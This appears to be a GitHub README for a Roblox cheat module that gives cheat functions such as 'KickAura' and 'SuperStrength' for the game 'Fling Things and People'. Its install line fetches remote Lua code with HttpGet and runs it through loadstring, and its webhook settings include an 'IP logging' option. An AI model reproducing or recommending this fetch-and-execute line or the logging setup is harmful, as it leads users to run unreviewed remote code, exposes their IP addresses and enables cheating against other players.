# 🚀 Elysium API (FTAP Module) ![Visitors](https://visitor-badge.laobi.icu/badge?page_id=Oxwoey.FTAP-Module)
**Test version**

**This module provides functions for the "Fling Things and People" game. Any player can use these functions and integrate them into their own scripts. The module is regularly updated and includes webhook configuration.**  

**[Discord Server](https://discord.gg/HZwu9crcC6)** *More info and support*  
---

## 📑 Update Log

<details> 
  <summary>2025-04-04</summary>
  
  - **v1.0b (BETA)** – Initial release
  
</details>

---

## 📥 Installation

Add the module to your script:  

```lua
local ApiFTAP = loadstring(game:HttpGet("https://raw.githubusercontent.com/Oxwoey/FTAP-Module/refs/heads/main/Module/ModuleFTAP"))()
```

---

## 🛠️ Quick Start

```lua
-- Webhook configuration
ApiFTAP:SetSettings({
    NameHub = "Elysium Hub",
    WebhookEnabled = true, -- Enable/Disable
    ExecuteLogSecret = false, -- IP logging
    WebhookLink = "YOUR_WEBHOOK_URL"
})

-- Activate functions
ApiFTAP.AntiGrab(true)
ApiFTAP.SuperStrength(true)
ApiFTAP.KickAura(true)
```

---

## 🌟 Features

- **Anti Functions**
- **Combat Functions**
- **Aura Functions**
- **Blobman Functions**
- **Webhook Settings**
  
---

## 🔗 Useful Links

- 📄 **[Full Documentation](Module/documentation.md)**
- 📝 **[Example Code](Module/example.lua)**
